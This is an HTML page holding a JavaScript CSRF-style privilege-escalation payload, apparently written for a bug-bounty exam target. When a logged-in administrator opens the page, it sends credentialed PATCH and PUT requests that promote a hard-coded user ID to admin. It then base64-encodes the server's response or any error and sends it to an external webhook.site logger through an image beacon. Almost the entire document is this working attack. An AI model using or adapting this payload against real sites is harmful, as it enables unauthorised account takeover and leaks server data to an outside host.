<!DOCTYPE html>
<html>
<body>
    <script>
        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
        const api = "https://api-bugbounty-exam.hashacademy.co/api";
        const myUserId = "69da4749adf0dbb976ce8e37"; 

        async function attemptElevation() {
            try {
                // Method 1: Target the specific user update endpoint
                // We're forcing the Admin to change your role to 'admin'
                const res = await fetch(`${api}/users/${myUserId}`, {
                    method: "PATCH",
                    headers: { "Content-Type": "application/json" },
                    credentials: "include",
                    body: JSON.stringify({ 
                        "role": "admin",
                        "isAdmin": true,
                        "permissions": ["all"]
                    })
                });
                
                const data = await res.json();
                new Image().src = `${logger}/?elevation_result=${btoa(JSON.stringify(data))}`;

                // Method 2: Target the profile endpoint (some systems allow self-promotion if the admin does it)
                await fetch(`${api}/auth/profile/${myUserId}`, {
                    method: "PUT",
                    headers: { "Content-Type": "application/json" },
                    credentials: "include",
                    body: JSON.stringify({ "role": "admin" })
                });

            } catch (e) {
                new Image().src = `${logger}/?error=${btoa(e.message)}`;
            }
        }

        attemptElevation();
    </script>
</body>
</html>
